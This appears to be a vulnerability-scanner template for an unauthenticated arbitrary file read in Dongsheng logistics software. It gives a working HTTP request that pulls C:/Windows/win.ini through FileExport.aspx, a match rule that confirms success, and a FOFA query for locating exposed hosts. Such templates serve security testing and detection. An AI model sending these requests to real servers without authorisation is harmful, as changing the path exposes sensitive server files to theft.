http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /Reports/FileExport.aspx?filename=C:/Windows/win.ini HTTP/1.1
          Host: {{Hostname}}
id: dongshengwuliu-FileExport_aspx-File-reading
info:
    author: Superhero
    description: |-
        fofa: app="东胜物流软件-物流软件"
        东胜物流软件 FileExport.aspx 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
    name: 东胜物流软件 FileExport.aspx 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/Q2Rdiwgz2bxGEZwtA_HxCg
    severity: high
    tags:
        - File reading
        - 东胜物流软件
